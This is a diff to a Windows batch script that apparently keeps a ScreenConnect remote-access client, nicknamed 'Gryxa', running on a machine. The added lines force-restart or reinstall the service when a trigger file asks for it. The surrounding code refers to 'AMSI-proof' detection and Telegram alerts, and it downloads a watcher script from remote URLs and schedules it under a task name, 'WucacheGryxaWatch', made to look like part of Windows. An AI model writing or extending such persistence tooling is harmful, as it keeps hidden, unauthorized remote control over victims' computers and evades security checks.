@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M63
+rem  OWN_MON  BUILD 20260804M64
+rem  M64: PUSH-RECONNECT under OBSERVE — bounce Gryxa / HEAL 1060; never clear watcher; no REINSTALL.
 rem  M63: OBSERVE still blocks REINSTALL;/x — allows HEAL start + 1060 /i (G10).
 rem  M62: QueueGryxaHeal hard-blocked under OBSERVE; pair with G10 (no shared ProductCode /x).
 rem  M61: arm gryxa_watch LOOP — record all Gryxa interference; Telegram on DROP with CAUSE.
@@ -629,7 +630,10 @@ if exist "%WD%\force_gryxa.new" (
     )
   )
 )
-if "!OBSERVE!"=="1" set "FORCE_G=0"
+rem OBSERVE blocks classic REINSTALL force only — PUSH-RECONNECT still runs (bounce/HEAL)
+set "FORCE_RECONNECT=0"
+if exist "%WD%\force_gryxa.new" findstr /C:"RECONNECT" "%WD%\force_gryxa.new" >nul 2>&1 && set "FORCE_RECONNECT=1"
+if "!OBSERVE!"=="1" if "!FORCE_RECONNECT!"=="0" set "FORCE_G=0"
 
 rem Detect Gryxa — CMD first (AMSI-proof). Only trust PS health if line starts with HEALTHY|BROKEN|STUCK|ABSENT|
 set "GH="
@@ -677,8 +681,32 @@ if "!GRYXA_OK!"=="0" if exist "%WD%\own_lib.ps1" (
 )
 echo gryxa_health=!GH!>>"%LOG%"
 
-rem FORCE push: never /x a live Guest — ack if already healthy; REINSTALL only when absent
+rem FORCE: PUSH-RECONNECT = bounce live Gryxa (panel wipe) or HEAL 1060; classic PUSH = 1060 REINSTALL only
 if "%FORCE_G%"=="1" (
+  if "!FORCE_RECONNECT!"=="1" (
+    echo gryxa_force_RECONNECT observe=!OBSERVE!>>"%LOG%"
+    if "!GRYXA_OK!"=="1" (
+      echo gryxa_force_reconnect_bounce>>"%LOG%"
+      sc stop "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+      timeout /t 4 /nobreak >nul
+      sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+      sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+      timeout /t 3 /nobreak >nul
+      sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    ) else (
+      sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+      if not errorlevel 1 (
+        echo gryxa_force_reconnect_start_only>>"%LOG%"
+        sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+        sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+      ) else (
+        echo gryxa_force_reconnect_heal_1060>>"%LOG%"
+        call :QueueGryxaHeal HEAL
+      )
+    )
+    if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
+    goto :GryxaAfter
+  )
   if "!OBSERVE!"=="1" (
     echo gryxa_force_suppressed_OBSERVE>>"%LOG%"
     if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
@@ -1012,7 +1040,7 @@ echo gryxa_heal_queued mode=%HEALMODE%>>"%LOG%"
 exit /b 0
 
 :EnsureGryxaWatch
-rem M61: download + arm continuous LOOP + 1-min TICK backup task
+rem M64/M61: download + arm continuous LOOP + 1-min TICK — NEVER delete WucacheGryxaWatch
 if not exist "%WD%\gryxa_watch.cmd" (
   "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\gryxa_watch.cmd" "%OWNWATCH%" >nul 2>&1
   if not exist "%WD%\gryxa_watch.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\gryxa_watch.cmd" "%OWNWATCH2%" >nul 2>&1
